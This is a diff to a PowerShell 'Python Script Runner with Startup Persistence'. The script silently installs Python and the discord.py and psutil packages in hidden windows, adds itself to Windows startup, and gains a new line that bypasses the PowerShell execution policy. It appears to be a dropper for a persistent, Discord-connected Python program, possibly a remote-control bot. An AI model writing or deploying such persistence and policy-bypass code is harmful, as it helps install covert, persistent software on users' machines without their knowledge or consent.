@@ -1,3 +1,6 @@
+# Bypass execution policy for Windows 10/11
+Set-ExecutionPolicy -ExecutionPolicy Bypass -Scope Process -Force
+
 # Python Script Runner with Startup Persistence - Windows 10/11 Compatible
 # Save as .ps1 file and run
 
@@ -43,14 +46,13 @@ function Test-Python {
     return $false
 }
 
-# Function to install Python silently - UPDATED TO USE FULL INSTALLER
+# Function to install Python silently
 function Install-Python {
     Write-Host "Installing Python..." -ForegroundColor Yellow
     
     # Use full Python installer (not embedded) for better compatibility
     $pythonUrl = "https://www.python.org/ftp/python/3.10.11/python-3.10.11-amd64.exe"
     $installerPath = "$env:TEMP\python_installer.exe"
-    $installPath = "$env:LOCALAPPDATA\Programs\Python\Python310"
     
     try {
         # Download Python installer
@@ -78,22 +80,21 @@ function Install-Python {
             # Refresh environment to recognize Python in PATH
             $env:Path = [System.Environment]::GetEnvironmentVariable("Path","Machine") + ";" + [System.Environment]::GetEnvironmentVariable("Path","User")
             
-            return $installPath
+            return $true
         } else {
             Write-Host "Python installer failed with exit code: $($process.ExitCode)" -ForegroundColor Red
-            return $null
+            return $false
         }
     } catch {
         Write-Host "Failed to install Python: $($_.Exception.Message)" -ForegroundColor Red
-        return $null
+        return $false
     }
 }
 
-# Function to install dependencies - SIMPLIFIED AND MORE RELIABLE
+# Function to install dependencies
 function Install-Dependencies {
     Write-Host "Installing Python packages..." -ForegroundColor Yellow
     
-    # Try multiple methods to install packages
     $packages = @("discord.py", "psutil")
     
     foreach ($pkg in $packages) {
@@ -119,17 +120,6 @@ function Install-Dependencies {
             }
         } catch {
             # Continue to next method
-        }
-        
-        # Method 3: Using easy_install as fallback
-        try {
-            $process = Start-Process -FilePath "python" -ArgumentList "-m", "easy_install", $pkg -Wait -PassThru -WindowStyle Hidden
-            if ($process.ExitCode -eq 0) {
-                Write-Host "✓ $pkg installed via easy_install" -ForegroundColor Green
-                continue
-            }
-        } catch {
-            # Package installation failed
         }
         
         Write-Host "⚠ Could not install $pkg, but continuing..." -ForegroundColor Yellow
@@ -176,16 +166,16 @@ function Add-Startup {
     return $false
 }
 
-# Main execution - SIMPLIFIED AND MORE RELIABLE
+# Main execution
 try {
     # Check if Python is available
     if (Test-Python) {
         Write-Host "✓ Python is available" -ForegroundColor Green
     } else {
         Write-Host "Python not found, installing..." -ForegroundColor Yellow
-        $pythonPath = Install-Python
+        $pythonInstalled = Install-Python
         
-        if (-not $pythonPath) {
+        if (-not $pythonInstalled) {
             Write-Host "❌ Python installation failed!" -ForegroundColor Red
             exit 1
         }
@@ -240,6 +230,3 @@ try {
 
 Write-Host "Setup completed!" -ForegroundColor Green
 Start-Sleep -Seconds 3
-
-
-
